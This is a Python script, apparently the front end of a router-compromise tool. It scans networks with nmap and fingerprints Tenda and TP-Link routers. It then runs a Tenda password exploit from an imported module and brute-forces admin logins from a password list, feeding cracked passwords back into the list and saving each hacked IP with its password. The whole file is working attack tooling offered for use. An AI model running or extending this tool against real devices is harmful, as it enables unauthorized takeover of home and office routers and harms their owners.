import tp_link
import time
import tenda
import mmh3
import xml.etree.ElementTree as ET
import subprocess
import argparse
import re
import requests
from colors import colors
parser = argparse.ArgumentParser(description='Local network scanner')
group1 = parser.add_mutually_exclusive_group(required=True)
group2 = parser.add_mutually_exclusive_group(required=True)
group1.add_argument('-n', '--networks', nargs="*", help='List of networks to scan or specify nmap result file')
group1.add_argument('-i', '--input', help='Input file of nmap results')
group1.add_argument('-a', '--addresses', nargs="*", help='List of addresses to scan')
group2.add_argument('-p', '--passwords',nargs="*", help='Manually add passwords to the list')
group2.add_argument('-f', '--password_file', help='Add passwords from a file')
parser.add_argument('-o', '--output', help='Output file', default="results.txt")
# parser.add_argument('-t', '--timeout', help='Timeout for each request', default=5)
args = parser.parse_args()
if(args.networks):
    subprocess.run(f"sudo nmap -sS -n -p 8080,80 {' '.join(args.networks)} --open -oX nmap.xml".split())
if(args.password_file):
    f = open("common.txt", "a+")
    f.seek(0)
    passList = [passwd.strip() for passwd in f]
else:
    passList = args.passwords
ipList = []
if not args.addresses:
    tree = ET.parse("nmap.xml" if args.networks else args.input)
    root = tree.getroot()
    for child in root:
        ports = []
        for schild in child.iter('port'):
            ports.append(schild.attrib['portid'])
        ip = list(child.iter('address'))
        if(ip):
            ip_addr = ip[0].attrib['addr']
            for port in ports:
                ipList.append(f"{ip_addr}:{port}")
else:
    ipList = args.addresses
success = []
failed = []
for ip in ipList:
    try:
        passwd = None
        if(tenda.is_tenda(f"http://{ip}")):
            print(f"{colors['Blue']}[*] {colors['Yellow']}Tenda found{colors['Color_Off']}")
            passwd = tenda.tenda_exploiter(ip)
            if not passwd:
                passwd = tenda.tenda_brute(ip, passList)
            if(passwd):
                success.append(f"{ip} - {passwd} | Tenda")
            else:
                failed.append(f"{ip} | Tenda")
            
        elif(tp_link.is_tplink(ip)):
            print(f"{colors['Blue']}[*] {colors['Yellow']}TP-Link found{colors['Color_Off']}")
            passwd = tp_link.tp_bruter(ip, passList)
            if(passwd):
                success.append(f"{ip} - {passwd} | TP-Link")
            else:
                failed.append(f"{ip} | TP-Link")
        else:
            request = requests.get(f"http://{ip}/", timeout=5)
            if("MW305R" in request.text):
                failed.append(f"{ip} | MW305R")
            else:
                failed.append(f"{ip} | Unknown")

        # if the pass is new add to common list
        if passwd and passwd not in passList:
            if(args.password_file):
                f.write("\n")
                f.write(passwd)
            passList.append(passwd)
    except:
        failed.append(f"{ip} | Unknown")
        continue

result = open("results.txt", "w")
result.write("Success:\n")
for line in success:
    result.write(line + "\n")
result.write("\nFailed:\n")
for line in failed:
    result.write(line + "\n")